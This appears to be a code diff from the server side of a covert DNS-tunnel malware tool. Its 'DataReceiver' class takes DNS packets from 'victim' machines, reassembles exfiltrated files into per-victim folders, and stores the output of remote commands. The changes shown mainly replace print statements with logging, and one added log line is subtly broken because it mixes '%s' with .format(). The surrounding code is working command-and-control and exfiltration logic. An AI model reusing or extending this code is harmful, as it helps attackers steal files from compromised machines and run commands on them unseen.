@@ -44,7 +44,7 @@ class DataReceiver():
         """
 
         # Fetch given command that should be sent to the client
-        print('ping')
+        log('DataReceiver', '_receive_ping', 'Received ping packet')
         victim_mac = Mac(pkt.getlayer(Ether).src)
 
         # Ignore broadcast since Ether() is sent as empty
@@ -70,7 +70,7 @@ class DataReceiver():
             pkt {Ether} -- packet that was sent by the client
         """
 
-        print('receive_data')
+        log('DataReceiver', '_receive_data', 'Received data packet')
         victim_mac = Mac(pkt.getlayer(Ether).src)
 
         # Ignore broadcast since Ether() is sent as empty
@@ -84,7 +84,7 @@ class DataReceiver():
         filename = fields[-2] + '.' + fields[-1]
         key = str(victim_mac) + '@' + filename
 
-        self._handle_data_pkts(pkt, dnsqr_layer)
+        self._handle_data_pkts(pkt, dnsqr_layer, filename, key)
 
 
     def _receive_recpt(self, pkt):
@@ -93,7 +93,7 @@ class DataReceiver():
         Arguments:
             pkt {Ether} -- packet sent from client
         """
-        print('receipt')
+        log('DataReceiver', '_receive_recpt', 'Received receipt packet')
 
         # Scapy concats the rdata together, even if it exceeds 255 bytes
         # test = pkt.getlayer(DNSRR)
@@ -128,7 +128,7 @@ class DataReceiver():
             f.write(dnsrr_layer.rrname[:-1] + '\n') # Command associated with output
             f.write(dnsrr_layer.rdata)
 
-    def _handle_data_pkts(self, pkt, dnsqr_layer):
+    def _handle_data_pkts(self, pkt, dnsqr_layer, filename, key):
         # Determine if it is a head, body, or tail packet
         if dnsqr_layer.qclass == DataRequestType.HEAD:
             # Create entry, append data
@@ -151,6 +151,7 @@ class DataReceiver():
             victim_dir = self.rel_path + str(victim_mac)
             with open(victim_dir + '/files/' + filename, 'wb+') as f:
                 buf = ''
+                log('DataReceiver', '_handle_data_pkts', 'Writing %s to file'.format(self.file_transfer[key]))
                 print(self.file_transfer[key])
                 for packet in self.file_transfer[key]:
                     buf += packet.data
